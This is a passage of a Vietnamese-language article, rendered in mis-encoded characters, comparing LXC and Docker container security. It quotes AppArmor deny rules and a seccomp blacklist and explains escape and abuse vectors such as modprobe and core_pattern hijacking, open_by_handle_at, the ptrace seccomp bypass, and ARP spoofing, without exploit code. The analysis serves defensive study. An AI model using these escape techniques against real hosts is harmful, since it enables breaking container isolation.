escapes). T·∫•t c·∫£ nh·ªØng ƒëi·ªÅu n√†y li√™n quan t·ªõi vi·ªác thay ƒë·ªïi v·ªã tr√≠ c·ªßa m·ªôt ti·ªán √≠ch (ch·∫≥ng h·∫°n nh∆∞ modprobe) m√† m√°y ch·ªß s·∫Ω g·ªçi khi m·ªôt s·ª± ki·ªán nh·∫•t ƒë·ªãnh x·∫£y ra (v√≠ d·ª• nh∆∞ y√™u c·∫ßu load y√™u c·∫ßu c·ªßa kernel module). B·∫±ng c√°ch thay ƒë·ªïi ƒëi·ªÅu n√†y ƒë·ªÉ tr·ªè ƒë·∫øn m·ªôt ch∆∞∆°ng tr√¨nh b√™n trong container c·ªßa ch√∫ng ta, attacker sau ƒë√≥ c√≥ th·ªÉ khi·∫øn m√°y ch·ªß ch·∫°y m·ªôt ƒëo·∫°n m√£ t√πy √Ω b√™n ngo√†i container\n  LXC s·ª≠ d·ª•ng b·ªô quy t·∫Øc sau ƒë·ªÉ ch·∫∑n c√°c cu·ªôc t·∫•n c√¥ng n√†y. L∆∞u √Ω, n√≥ kh√¥ng ph·∫£i l√† m·ªôt c·∫•u h√¨nh c·∫£u AppArmor, n√≥ l√† ƒë·∫ßu v√†o cho m·ªôt ƒëo·∫°n l·ªánh python nh·ªè t·∫°o ra m·ªôt ph·∫ßn d√†i (long portion) c·ªßa c√°c quy t·∫Øc AppArmor.\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14  # Run lxc-generate-aa-rules.py on this file after any modification, to generate\r# the container-rules file which is appended to container-base.in to create the\r# final abstractions/container-base.\rblock /sys\rallow /sys/fs/cgroup/**\rallow /sys/devices/virtual/net/**\rallow /sys/class/net/**\rblock /proc/sys\rallow /proc/sys/kernel/shm*\rallow /proc/sys/kernel/sem*\rallow /proc/sys/kernel/msg*\rallow /proc/sys/kernel/hostname\rallow /proc/sys/kernel/domainname\rallow /proc/sys/net/**\r  Nh·ªØng vector quan tr·ªçng n√†o ƒëang b·ªã ch·∫∑n?\n  uevent_helper: uevents l√† nh·ªØng s·ª± ki·ªán ƒë∆∞·ª£c kernel k√≠ch ho·∫°t khi m·ªôt thi·∫øt b·ªã th√™m v√†o ho·∫∑c x√≥a ƒëi. ƒêi·ªÅu ƒë√°ng ch√∫ √Ω l√† ƒë∆∞·ªùng d·∫´n c·ªßa \u0026ldquo;uevent_helper\u0026rdquo; c√≥ th·ªÉ ƒë∆∞·ª£c ch·ªânh s·ª≠a b·∫±ng c√°ch ghi v√†o \u0026quot;/sys/kernel/uevent_helper\u0026rdquo;. Do ƒë√≥, khi m·ªôt uevent ƒë∆∞·ª£c k√≠ch ho·∫°t (c≈©ng c√≥ th·ªÉ ƒë∆∞·ª£c th·ª±c hi·ªán t·ª´ userland b·∫±ng c√°ch ghi v√†o c√°c t·ªáp nh∆∞ \u0026quot;/sys/class/mem/null/event\u0026rdquo;), \u0026ldquo;uevent_helper ƒë·ªôc h·∫°i\u0026rdquo; s·∫Ω ƒë∆∞·ª£c th·ª±c thi.\n  modprobe: modprobe l√† m·ªôt ti·ªán √≠ch thu·ªôc userland, ƒë∆∞·ª£c kernel g·ªçi khi kernel c·∫ßn load m·ªôt kernel module. V·ªã tr√≠ c·ªßa n√≥ c√≥ th·ªÉ ƒë∆∞·ª£c thay ƒë·ªïi b·∫±ng c√°ch s·ª≠a ƒë·ªïi \u0026quot;/proc/sys/kernel/modprobe\u0026rdquo;, v√† sau ƒë√≥ ch√∫ng ta ch·ªâ c·∫ßn th·ª±c hi·ªán m·ªôt h√†nh ƒë·ªông n√†o ƒë√≥ ƒë·ªÉ kernel t·∫£i m·ªôt kernel module, code ch√∫ng ta s·∫Ω ƒë∆∞·ª£c th·ª±c thi. (Ch·∫≥ng h·∫°n nh∆∞ s·ª≠ d·ª•ng crypto-API ƒë·ªÉ t·∫£i crypto-module ho·∫∑c s·ª≠ d·ª•ng ifconfig ƒë·ªÉ t·∫£i networking module cho thi·∫øt b·ªã hi·ªán kh√¥ng s·ª≠ d·ª•ng.)\n  core_pattern: core_patterns th∆∞·ªùng s·ª≠ d·ª•ng ƒë·ªÉ cho kernel bi·∫øt c√°ch ƒë·∫∑t t√™n v√† ƒë·ªãnh d·∫°ng c√°c core dumps ƒë∆∞·ª£c t·∫°o khi ch∆∞∆°ng tr√¨nh b·ªã crash. Tuy nhi√™n, n√≥ l·∫°i c√≥ 1 t√≠nh nƒÉng r·∫•t t·ªá: \u0026ldquo;t·ª´ Linux kernel 2.6.19. Linux h·ªó tr·ª£ c√∫ ph√°p thay th·∫ø cho t·ªáp /proc/sys/kernel/core_patterm. N·∫øu k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa t·ªáp n√†y l√† k√≠ t·ª± pipe (|), th√¨ ph·∫ßn c√≤n l·∫°i c·ªßa d√≤ng n√†y ƒë∆∞·ª£c hi·ªÉu l√† m·ªôt ch∆∞∆°ng tr√¨nh s·∫Ω ƒë∆∞·ª£c th·ª±c thi. Thay v√¨ ƒë∆∞·ª£c ghi v√†o ƒëƒ©a, core dump l√∫c b√¢y gi·ªù s·∫Ω ƒë∆∞·ª£c xem l√† m·ªôt chu·∫©n input c·ªßa ch∆∞∆°ng tr√¨nh tr√™n.\u0026quot;.\nS·ª≠ d·ª•ng t√≠nh nƒÉng tr√™n, core_pattern c√≥ th·ªÉ ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh ƒë·ªÉ g·ªçi ch∆∞∆°ng tr√¨nh c·ªßa ch√∫ng ta, r·ªìi ƒë·ªÉ k√≠ch ho·∫°t n√≥, ta ch·ªâ c·∫ßn l√†m cho ch∆∞∆°ng tr√¨nh b·ªã crash.\n  /proc/sys/vm/panic_on_oom: ƒë√¢y l√† global flag, x√°c ƒë·ªãnh kernel c√≥ \u0026ldquo;ho·∫£ng s·ª£\u0026rdquo; (panic) khi g·∫∑p ph·∫£i t√¨nh tr·∫°ng h·∫øt b·ªô nh·ªõ hay kh√¥ng (Out Of Memory - OOM). ƒêi·ªÅu n√†y cho ph√©p ch√∫ng ta ti·∫øn h√†nh m·ªôt cu·ªôc t·∫•n c√¥ng DOS ƒë∆°n gi·∫£n.\n  Dangerous Paths 1 2 3 4 5  # block some other dangerous paths\rdeny @{PROC}/kcore rwklx,\rdeny @{PROC}/kmem rwklx,\rdeny @{PROC}/mem rwklx,\rdeny @{PROC}/sysrq-trigger rwklx,\r    kcore cung c·∫•p k·∫øt xu·∫•t ƒë·∫ßy ƒë·ªß c·ªßa b·ªô nh·ªõ v·∫≠y l√≠ h·ªá th·ªëng (full dump of the physical memory) ·ªü d·∫°ng core file. N√≥ kh√¥ng cho ph√©p ghi v√†o b·ªô nh·ªõ ƒë√£ n√≥i. Quy·ªÅn truy v√†o ƒëi·ªÅu n√†y cho ph√©p container c√≥ th·ªÉ ƒë·ªçc t·∫•t c·∫£ host memory.\n  kmem: \u0026ldquo;/proc/kmem\u0026rdquo; l√† m·ªôt giao di·ªán thay th·∫ø cho \u0026ldquo;/dev/kmem\u0026rdquo; (quy·ªÅn truy c·∫≠p tr·ª±c ti·∫øp b·ªã ch·∫∑n b·ªõi cgroup device whitelist), l√† m·ªôt k√≠ t·ª± ƒë·∫°i di·ªán cho kernel virtual memory. N√≥ cho ph√©p c·∫£ ƒë·ªçc v√† vi·∫øt, cho ph√©p tr·ª±c tieps s·ª≠a ƒë·ªïi kernel memory. (N√≥ ƒë√≤i h·ªèi s·ª± kh√©o l√©o h∆°n m·ªôt ch√∫t so v·ªõi kmem, v√¨ c√°c ƒë·ªãa ch·ªâ ·∫£o c·∫ßn ƒë∆∞·ª£c ph√¢n gi·∫£i th√†nh c√°c ƒë·ªãa ch·ªâ v·∫≠t l√≠ tr∆∞·ªõc).\n  sysrq-trigger: ghi v√†o t·ªáp ƒë·∫∑c bi·ªát n√†y cho ph√©p g·ª≠i c√°c l·ªánh kh√≥a y√™u c·∫ßu (Request Key commands), cho ph√©p m√¥t s·ªë h√†nh ƒë·ªông ƒë·∫∑c quy·ªÅn, ch·∫≥ng h·∫°n nh∆∞ h·ªßy c√°c quy tr√¨nh, li·ªát k√™ t·∫•t c·∫£ c√°c quy tr√¨nh tr√™n h·ªá th√¥ng ho·∫∑c k√≠ch ho·∫°t kh·ªüi ƒë·ªông l·∫°i m√°y ch·ªß.\n  C√°c kh·ªëi quan tr·ªçng cu·ªëi c√πng ghi ƒë·∫øn m·ªôt s·ªë n∆°i kh√°c nhau c√≥ th·ªÉ nguy hi·ªÉm:\n1 2 3 4 5 6  # deny writes in /sys except for /sys/fs/cgroup, also allow\r# fusectl, securityfs and debugfs to be mounted there (read-only)\rdeny mount fstype=debugfs -\u0026gt; /var/lib/ureadahead/debugfs/,\rdeny /sys/firmware/efi/efivars/** rwklx,\rdeny /sys/kernel/security/** rwklx,\rdeny @{PROC}/sys/fs/** wklx,\r    debugfs: cung c·∫•p m·ªôt giao di·ªán \u0026ldquo;no rules\u0026rdquo; m√† kernel (ho·∫∑c kernel module) c√≥ th·ªÉ t·∫°o ra c√°c giao di·ªán debug c√≥ th·ªÉ truy c·∫≠p v√†o v√πng ng∆∞·ªùi d√πng (userland). N√≥ ƒë√£ c√≥ m·ªôt s·ªë v·∫•n ƒë·ªÅ v·ªÅ b·∫£o m·∫≠t trong qu√° kh·ª© v√† c√°c nguy√™n t·∫Øc \u0026ldquo;no rules\u0026rdquo; ƒë·∫±ng sau h·ªá th·ªëng t·ªáp th∆∞·ªùng xung ƒë·ªôt v·ªõi c√°c r√†ng bu·ªôc b·∫£o m·∫≠t. B√™n trong m·ªôt LXC container, n√≥ ƒë∆∞·ª£c g√°n ·ªü ch·∫ø ƒë·ªô ch·ªâ ƒë·ªçc.\n  /sys/firmware/efi/efivars: efivars cung c·∫•p m·ªôt giao di·ªán ƒë·ªÉ vi·∫øt v√†o NVRAM s·ª≠ d·ª•ng cho c√°c ƒë·ªëi s·ªë kh·ªüi ƒë·ªông UEFI (UEFI boot arguments). Vi·ªác s·ª≠a ƒë·ªïi ch√∫ng c√≥ th·ªÉ khi·∫øn m√°y ch·ªß kh√¥ng th·ªÉ kh·ªüi ƒë·ªông ƒë∆∞·ª£c (unbootable).\n  /sys/kernel/security: ƒë∆∞·ª£c g√°n ·ªü ƒë√¢y l√† m·ªôt giao di·ªán securityfs, cho ph√©p c·∫•u h√¨nh Linux Security Modules. N√≥ cho ph√©p c·∫•u h√¨nh ch√≠nh s√°ch c·ªßa AppArmor, v√¨ v·∫≠y, quy·ªÅn truy c·∫≠p v√†o ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p m·ªôt v√πng ch·ª©a v√¥ hi·ªáu h√≥a h·ªá th·ªëng MAC c·ªßa n√≥.\n  /proc/sys/fs: Th∆∞ m·ª•c n√†y ch·ª©a m·ªôt m·∫£ng c√°c options v√† th√¥ng tin li√™n quan ƒë·∫øn c√°c kh√≠a c·∫°nh kh√°c nhau c·ªßa h·ªá th·ªëng t·ªáp, bao g·ªìm: quota, file handle, inode, and dentry information. Ghi v√†o th∆∞ m·ª•c n√†y cho ph√©p c√°c cu·ªôc t·∫•n c√¥ng t·ª´ ch·ªëi d·ªãch v·ª• kh√°c nhau ch·ªëng l·∫°i m√°y ch·ªß.\n  seccomp  L√† c∆° ch·∫ø cho system call filtering. Ch√≠nh s√°ch c·ªßa policies ƒë·∫øn t·ª´ 2 version.  Trong version 1, m·ªôt filter l√† m·ªôt t·∫≠p h·ª£p nh·ªè c√°c l·ªánh g·ªçi h·ªá th·ªëng kh√¥ng th·ªÉ t√πy ch·ªânh. Trong version 2, \u0026ldquo;Filter mode\u0026rdquo;, system call filter ƒë∆∞·ª£c vi·∫øt nh∆∞ ch∆∞∆°ng tr√¨nh l·ªçc g√≥i Berkeley (Berkeley Packet Filter - BPF). ƒêi√™u\nƒê√¢y ƒë∆∞·ª£c g·ªçi l√† \u0026ldquo;Strict\u0026rdquo; mode. LXC hi·ªán t·∫°i s·ª≠ d·ª•ng m·ªôt ch√≠nh s√°ch kh√° ƒë∆°n gi·∫£n, trong khi b·∫£n release 1.10 c·ªßa docker ƒë∆∞·ª£c gi·ªõi thi·ªáu h·ªó tr·ª£ cho seccomp-bpf. M·ªôt ƒëi·ªÅu l∆∞u √Ω l√† trong Docker 1.10, seccomp kh√¥ng ƒë∆∞·ª£c s·ª≠ d·ª•ng theo m·∫∑c ƒë·ªãnh tr√™n trusty (h∆°i kh√≥ hi·ªÉu v√¨ docker 1.10 tr√™n ubuntu 15.10, seccomp v·∫´n ƒë∆∞·ª£c s·ª≠ d·ª•ng m·∫∑c ƒë·ªãnh). Tuy nhi√™n, k·ªÉ t·ª´ Docker 1.11.1 seccomp hi·ªán c≈©ng ƒë∆∞·ª£c s·ª≠ d·ª•ng theo m·∫∑c ƒë·ªãnh tr√™n trusty.    T·∫ßm quan tr·ªçng c·ªßa Seccomp Seccomp-BPF cho ph√©p c·∫•u h√¨nh l·ªçc nh·ªØng \u0026ldquo;l·ªùi g·ªçi h·ªá th·ªëng nguy hi·ªÉm\u0026rdquo;. ƒê·ªëi v·ªõi m·ªôt s·ªë phi√™n b·∫£n hi·ªán nay, LXC ƒë√£ xu·∫•t x∆∞·ªüng v·ªõi ch√≠nh s√°ch seccomp r·∫•t nh·ªè, ƒë∆°n gi·∫£n,\nv·ªõi minh h·ªça ·ªü d∆∞·ªõi. V·ªõi b·∫£n Docker 1.10, Docker ƒë√£ th√™m nhi·ªÅu ch√≠nh s√°ch ph·ª©c t·∫°p h∆°n.\n1 2 3 4 5 6 7 8 9  2\rblacklist\rreject_force_umount # comment this to allow umount -f; not recommended\r[all]\rkexec_load errno 1\ropen_by_handle_at errno 1\rinit_module errno 1\rfinit_module errno 1\rdelete_module errno 1\r  Ph·∫ßn ƒë·∫ßu c·ªßa ch√≠nh s√°ch LXC ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ m·ªôt bi·ªán ph√°p b·∫£o v·ªá chuy√™n s√¢u ƒë·ªÉ ngƒÉn ch·∫°n c√°c v√πng ch·ª©a bu·ªôc ph·∫£i ummounting c√°c ph·∫ßn c·ªßa filesystem.\nKernel Manipulation M·ªôt s·ªë l·ªánh cho ph√©p thao t√°c v·ªõi kernel module b·ªã c·∫•m (init_module, finit_module, delete_module), c≈©ng nh∆∞ kexec_load cho ph√©p thay th·∫ø kernel hi·ªán t·∫°i b·∫±ng m·ªôt kernel images m·ªõi. L∆∞u √Ω, c√≥ m·ªôt s·ªë bi·ªán ph√°p b·∫£o v·ªá chuy√™n s√¢u ch·ªëng l·∫°i vi·ªác khai th√°c ch√∫ng trong c√°c container ƒë·∫∑c quy·ªÅn:\n init_module, finit_module, delete_module: t·∫•t c·∫£ y√™u c·∫ßu SYS_MODULE capability - ƒë√£ b·ªã lo·∫°i b·ªè b·ªüi Docker v√† LXC trong privileged containers. kexec_load kh√¥ng y√™u c·∫ßu SYS_MODULE, thay v√†o ƒë√≥ n√≥ y√™u c·∫ßu SYS_BOOT - privileged LXC container gi·ªØ. Trong h·∫ßu h·∫øt c√°c tr∆∞·ªùng h·ª£p, ƒëi·ªÅu n√†y kh√¥ng th·ªÉ khai th√°c (m√† kh√¥ng bypass seccomp), tuy nhi√™n, ƒëi·ªÅu ƒë√°ng ch√∫ √Ω l√† Linux 3.17 ƒë√£ g·ªõi hi·ªáu 1 bi·∫øn th·ªÉ m·ªõi c·ªßa kexec: kexec_file_load. L·ªánh g·ªçi n√†y (t·∫£i signed kernels) kh√¥ng n·∫±m trong danh s√°ch ƒëen c·ªßa privileged LXC container, v√† ch·ªâ y√™u c·∫ßu SYS_BOOT. Tuy nhi√™n, v√πng ch·ª©a LXC ƒë·∫∑c quy·ªÅn c√≥ m·ªôt s·ªë v·∫•n ƒë·ªÅ kh√°c cho ph√©p tho√°t kh·ªèi container m√† kh√¥ng c·∫ßn boot v√†o kernel m·ªõi (v√¨ tr√™n th·ª±c t·∫ø, ch√∫ng ta c√≥ th·ªÉ bypass seccomp).  The Issue With open_by_handle_at() open_by_handle_at l√† m·ªôt l·ª£i g·ªçi h·ªá th·ªëng kh√° th√∫ v·ªã, ban ƒë·∫ßu n√≥ ƒë∆∞·ª£c ƒë∆∞a v√†o kernel ƒë·ªÉ h·ªó tr·ª£ userspace file servers ƒë·ªÉ c√°c process d·ªÖ d√†ng chuy·ªÉn c√°c m√£ ƒë·ªãnh danh t·ªáp duy nh·∫•t (unique file identifiers) cho nhau. Tuy nhi√™n, n√≥ l·∫°i l√† m·ªôt c∆°n √°c m·ªông c·ªßa b·∫£o m·∫≠t. B·∫•t k√¨ process n√†o c√≥ kh·∫£ nƒÉng DAC_READ_SEARCH ƒë·ªÅu c√≥ th·ªÉ s·ª≠ d·ª•ng open_by_handle_at ƒë·ªÉ c√≥ quy·ªÅn truy c·∫≠p v√†o b·∫•t c·ª© t·ªáp n√†o, ngay c·∫£ c√°c t·ªáp b√™n ngo·∫°i kh√¥ng gian t√™n g·∫Øn k·∫øt c·ªßa ch√∫ng. X·ª≠ l√≠ ƒë∆∞·ª£c chuy·ªÉn v√†o open_by_handle_at nh·∫±m m·ª•c ƒë√≠ch gi√∫p m·ªôt s·ªë nh·∫≠n d·∫°ng kh√¥ng r√µ ƒë∆∞·ª£c truy xu·∫•t b·∫±ng c√°ch s·ª≠ d·ª•ng name_to_handle_at. Tuy nhi√™n, qu√° tr√¨nh x·ª≠ l√≠ n√†y l·∫°i ch·ª©a th√¥ng tin nh·∫°y c·∫£m v√† c√≥ th·ªÉ b·ªã gi·∫£ m·∫°o. L·ªói n√†y ƒë∆∞·ª£c ch·ªâ ra trong docker container b·ªüi Sebastian krahmer, ƒëi·ªÅu n√†y ƒë√£ ·∫£nh h∆∞·ªõng ƒë·∫øn c·∫£ LXC v√† Docker.\nN√≥ c≈©ng l√† m·ªôt v·∫•n ƒë·ªÅ trong OpenVZ (m·ªôt h·ªá th·ªëng container kh√°c, nh∆∞ng nay ƒë√£ kh√¥ng c√≤n ph·ªï bi·∫øn nhi·ªÅu n·ªØa). Docker ƒë√£ gi·∫£i quy·∫øt b·∫±ng c√°ch b·ªè DAC_READ_SEARCH (c≈©ng nh∆∞ ch·∫∑n nh∆∞ng truy c·∫≠p v√†o open_by_handle_at b·∫±ng seccomp). LXC gi·∫£i quy·∫øt b·∫±ng c√°ch s·ª≠ d·ª•ng user namespaces, v√† m·∫∑c ƒë·ªãnh ch·∫∑n nh·ªØng l·ªùi g·ªçi h·ªá th·ªëng th√¥ng qua seccomp. Ch√≠nh s√°ch c·ªßa seccomp ƒë√£ b·ªã v√¥ hi·ªáu h√≥a trong c·∫£ privileged v√† unprivileged c·ªßa LXC containers. V√¨ v·∫≠y, nh·ªØng ng∆∞·ªùi d√πng th·∫≠n tr·ªçng ƒë∆∞·ª£c khuy√™n n√™n c·∫•u h√¨nh unprivileged LXC container v√† b·ªè DAC_READ_SEARCH (v√† c√≥ th·ªÉ c·∫£ SYS_PTRACE).\nAbusing Privileged Containers SYS_RAWIO Abuse  SYS_RAWIO ƒë∆∞·ª£c cho l√† d·ªÖ l·∫°m d·ª•ng v√¨ n√≥ ƒë∆∞·ª£c s·ª≠ d·ª•ng tr√™n to√†n b·ªô kernel v√† trong m·ªôt s·ªë ng·ªØ c·∫£nh nh·∫°y c·∫£m, ƒëi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác t√¨m th·∫•y l·ªói container escape tr√™n LXC privileged container. Nh·ªØng phi√™n b·∫£n m·ªõi c·ªßa LXC ƒë√£ b·ªè SYS_RAWIO v√† c√≥ th√™m nh·ªØng lu·∫≠t AppArmor ƒë·ªÉ ch·∫∑n truy c·∫≠p v√†o \u0026ldquo;/proc/bus\u0026rdquo;. T·ª´ b√™n trong containter, ta c√≥ th·ªÉ truy c·∫≠p v√†o \u0026ldquo;control regions\u0026rdquo; c·ªßa thi·∫øt b·ªã ƒë∆∞·ª£c g·∫Øn v√†o host PCI bus b·∫±ng \u0026ldquo;/proc/bus/pci/interface\u0026rdquo;. ƒê·ªÉ truy c·∫≠p v√†o \u0026ldquo;/proc/interface\u0026rdquo; c·∫ßn ph·∫£i c√≥ quy·ªÅn SYS_RAWIO. Th·∫≠m ch√≠, ƒë∆∞·ªùng d·∫´n \u0026ldquo;/proc\u0026rdquo; b·ªã ch·∫∑n b·ªüi AppArmor, container v·ªõi SYS_RAWIO v·∫´n c√≥ th·ªÉ ti·∫øp t·ª•c truy c·∫≠p v√†o interface n√†y th√¥ng qua \u0026ldquo;iopl/ioperm\u0026rdquo; (sau ƒë√≥ s·ª≠ d·ª•ng inb, outb, friends ƒë·ªÉ truy c·∫≠p v√†o IO ports). M·ªôt ƒëi·ªÅu l∆∞u √Ω l√† Docker kh√¥ng b·ªã l·ªói n√†y, v√¨ \u0026quot;/proc\u0026rdquo; th∆∞·ªùng ƒë∆∞·ª£c g·∫Øn cho ch·∫ø ƒë·ªô ch·ªâ ƒë·ªçc v√† SYS_RAWIO b·ªã lo·∫°i b·ªè. Trong ph·∫£n h·ªìi v·ªÅ l·ªói n√†y, nh√≥m LXC nh·∫≠n x√©t r·∫±ng h·ªç coi c√°c v√πng privileged container v·ªën kh√¥ng an to√†n, v√¨ c√≥ m·ªôt l·ªó h·ªïng ƒë√£ bi·∫øt v√† \u0026ldquo;kh√¥ng th·ªÉ s·ª≠a\u0026rdquo; trong c√°c v√πng privileged containers.  The ptrace Hole \u0026ldquo;Ki·ªÉm tra seccomp s·∫Ω kh√¥ng ƒë∆∞·ª£c ch·∫°y l·∫°i sau khi tracer ƒë∆∞·ª£c th√¥ng b√°o. (ƒêi√™u n√†y c√≥ nghƒ©a l√† h·ªôp c√°t d·ª±a tr√™n seccomp KH√îNG cho ph√©p s·ª≠ d·ª•ng ptrace, ngay c·∫£ sandboxed processes, maf kh√¥ng th·∫≠n tr·ªçng, ptracer c√≥ th·ªÉ ƒë∆∞·ª£c b·ªã s·ª≠ d·ª•ng ƒë·ªÉ escappe).\u0026rdquo;\n  B·∫£n th√¢n \u0026ldquo;l·ªó h·ªïng b·∫£o m·∫≠t\u0026rdquo; l√† m·ªôt v·∫•n ƒë·ªÅ ƒë∆°n gi·∫£n v·ªÅ Time-of-Check-to-Time-of-Use (TOCTTOU): seccomp filtering ƒë∆∞·ª£c √°p d·ª•ng tr∆∞·ªõc khi tracer ƒë∆∞·ª£c th√¥ng b√°o (v√† tr∆∞·ªõc khi cu·ªôc g·ªçi h·ªá th·ªëng th·ª±c s·ª± d∆∞·ª£c k√≠ch ho·∫°t), v√¨ v·∫≠y pacer c√≥ th·ªÉ s·ª≠a ƒë·ªïi c√°c thanh ghi ƒë∆∞·ª£c s·ª≠ d·ª•ng trong l·ªánh g·ªçi h·ªá th·ªëng (sau khi ch√∫ng ƒë√£ ƒë∆∞·ª£c ki·ªÉm tra b·ªüi seccomp) ƒë·ªÉ bi·∫øn m·ªôt l·ªánh g·ªçi h·ªá th·ªëng t·ª´ b√¨nh th∆∞·ªùng tr·ªü th√†nh \u0026ldquo;ƒë·ªôc h·∫°i\u0026rdquo;.\nC√°ch mafg docker gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y ƒë∆°n gi·∫£n l√† kh√¥ng cho ph√©p s·ª≠ d·ª•ng ptrace trong containers (b·∫±ng c√°ch lo·∫°i b·ªè SYS_PTRACE ·ªü ch·∫ø ƒë·ªô m·∫∑c ƒë·ªãnh). M·∫∑c d√π seccomp c√≥ th·ªÉ b·ªã v√¥ hi·ªáu h√≥a b·∫±ng c√°ch s·ª≠ d·ª•ng ptrace trong unprivileged contaner, vi·ªác l√†m d·ª•ng open_by_handle_at s·∫Ω kh√¥ng th√†nh c√¥ng, v√¨ qu√° pocess v·∫´n thi·∫øu DAC_READ_SEARCH trong root namespace. V·ªõi vi·ªác b·ªï sung user namespace v√†o docker, kh·∫£ nƒÉng docker s·∫Ω cho ph√©p s·ª≠ d·ª•ng ptrace b√™n trong container (m·∫∑c d√π kh√¥ng ch·∫Øc do s·ª± t·∫≠p trung g·∫ßn ƒë√¢y c·ªßa h·ªç v√†o seccomp).\n  M·∫∑c d√π LXC privileged containers v·ªën ƒë√£ kh√¥ng an to√†n, vi·ªác t√¨m ra c√°c ƒëi·ªÉm ƒë·ªôt ph√° (breakout) l√† m·ªôt b√†i t·∫≠p th√∫ v·ªã (v√† th∆∞·ªùng ch√∫ng c√≥ th·ªÉ l√†m cho c√°c privileged container an to√†n h∆°n m·ªôt ch√∫t)\n  Abusing Unprivileged Containers Ti·∫øp theo, ch√∫ng ta s·∫Ω t√¨m hi·ªÉu nh·ªØng ƒëi·ªÉm y·∫øu c·ªßa unprivileged containers.\nPID Namespacing Info-Leak Ch√∫ng ta s·∫Ω n√≥i ƒë·∫øn t·ªáp /proc/sched_debug. pseudo-file n√†y cho ph√©p unprivileged user c√≥ th·ªÉ xem th√¥ng tin debug cho Linux scheduler v√† kh√¥ng bi·∫øt PID-namespace. D·ªÖ th·∫•y, n√≥ ti·∫øt l·ªô t√™n v√† PID c·ªßa t·∫•t c·∫£ c√°c ti·∫øn tr√¨nh ƒëang ch·∫°y tr√™n h·ªá th·ªëng (v√† th·∫≠m ch√≠ bi·∫øt c·∫£ nh√≥m t√°c v·ª• c·ªßa ch√∫ng (cgroup) l√† g√¨, gi√∫p x√°c ƒë·ªãnh ƒë∆∞·ª£c c√°c v√πng ch·ª©a kh√°c tr√™n h·ªá th·ªëng v√† h·ªá th·ªëng container n√†o ƒëang ƒë∆∞·ª£c th·ª±c thi). L·ªói n√†y ƒë√£ ƒë∆∞·ª£c reported cho c·∫£ Docker v√† LXC v√† n√≥ ƒë√£ ƒë∆∞·ª£c v√° ·ªü Docker.\nNET_RAW abuse C·∫•u h√¨nh ph·ªï bi·∫øn nh·∫•t cho c√°c c√¥ng ty cung c·∫•p gi·∫£i ph√°p PaaS ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n container l√† c√≥ nhi·ªÅu container c·ªßa kh√°ch h√†ng ch·∫°y tr√™n c≈©ng m·ªôt m√°y ch·ªß v·∫≠t l√Ω. Theo m·∫∑c ƒë·ªãnh, c·∫£ LXC v√† Docker ƒë·ªÅu thi·∫øt l·∫≠p container network ƒë·ªÉ t·∫•t c·∫£ c√°c v√πng ch·ª©a chia s·∫ª c√πng m·ªôt Linux virtual bridge. Do ƒë√≥, nh·ªØng container n√†y s·∫Ω c√≥ th·ªÉ giao ti·∫øp v·ªõi nhau. Ngay c·∫£ khi quy·ªÅn truy c·∫≠p m·∫°ng tr·ª±c ti·∫øp n√†y b·ªã v√¥ hi·ªáu h√≥a (set flag -icc = false cho Docker ho·∫∑c s·ª≠ d·ª•ng iptables rules cho LXC), c√°c container v·∫´n kh√¥ng b·ªã h·∫°n ch·∫ø ƒë·ªëi v·ªõi vi·ªác truy c·∫≠p link-layer traffic. ƒê·∫∑c bi·ªát, c√≥ th·ªÉ ti·∫øn h√†nh m·ªôt cu·ªôc t·∫•n c√¥ng gi·∫£ m·∫°o ARP v√†o m·ªôt container kh√°c trong c√πng m·ªôt h·ªá th·ªëng m√°y ch·ªß, cho ph√©p t·∫•n c√¥ng full middle-person ƒë·ªëi v·ªõi l∆∞u l∆∞·ª£ng c·ªßa container m·ª•c ti√™u. Ch√∫ng ta s·∫Ω c√≥ m·ªôt b√†i vi·∫øt n√≥i r√µ h∆°n v·ªÅ c√°ch t·∫ßn c√¥ng n√†y.\nSau khi nh·∫≠n ƒë∆∞·ª£c b√°o c√°o n√†y, LXC team ƒë√£ ƒë·ªÅ xu·∫•t m·ªôt s·ªë gi·∫£i ph√°p, ch√∫ng bao g·ªìm:\n S·ª≠ d·ª•ng LXD v·ªõi OpenStack ƒë·ªÉ qu·∫£n l√≠ container networking S·ª≠ d·ª•ng libvirt ƒë·ªÉ qu·∫£n l√≠ MAC tables c·ªßa bridges/containers. S·ª≠ d·ª•ng m·ªôt virtual bridge ri√™ng tr√™n m·ªói trust zone ho·∫∑c tr√™n m·ªói container.  Denial of Service Attacks User namespaces ho·∫°t ƒë·ªông b·∫±ng c√°ch \u0026ldquo;sliding\u0026rdquo; UIDs gi·ªØa user namspace (container) v√† root namespace (host). V√≠ d·ª•, m·∫∑c ƒë·ªãnh c√†i ƒë·∫∑t c·ªßa LXC th√¨ UID 0 b√™n trong contaner s·∫Ω tr·ªü th√†nh UID 100000 tr√™n host. Tuy nhi√™n, m·∫∑c ƒë·ªãnh tr√™n c·∫£ LXC v√† Docker l√† s·ª≠ d·ª•ng c√πng m·ªôt trang tr√¨nh b√†y UID cho t·∫•t c·∫£ c√°c unprivileged container.\nN√≥i c√°ch kh√°c, c√°c UID gi·ªëng h·ªát nhau c·ªßa c√°c process trong container kh√°c nhau s·∫Ω c√≥ gi√° tr·ªã gi·ªëng nhau tr√™n m√°y ch·ªß, ch·ªâ ƒë∆∞·ª£c chuy√™n l√™n b·∫±ng m·ªôt slide kh√¥ng ƒë·ªïi (t·ª©c l√† t·∫•t c·∫£ c√°c process ƒëang ch·∫°y d∆∞·ªõi root b√™n trong b·∫•t k√¨ container n√†o s·∫Ω ƒëang ch·∫°y v·ªõi UID 100000 tr√™n host). ƒêi·ªÅu nay l√†m tƒÉng kh·∫£ nƒÉng ulimit c·ªßa ng∆∞·ªùi d√πng khi b·ªã t·∫•n c√¥ng, v√¨ c√°c khu v·ª±c n√†y c·ªßa kernel kh√¥ng x√°c ƒë·ªãnh ƒë∆∞·ª£c user namespace. L∆∞u √Ω r·∫±ng c√°c ƒëi·ªÅu ki·ªán c·ªßa t·ª´ ch·ªëi d·ªãch v·ª• (Dos) x·∫£y ra m√† kh√¥ng c·∫ßn user namespace (c≈©ng nh∆∞ ƒëi·ªÅu ki·ªán t∆∞∆°ng t·ª± c·ªßa UID m√°y 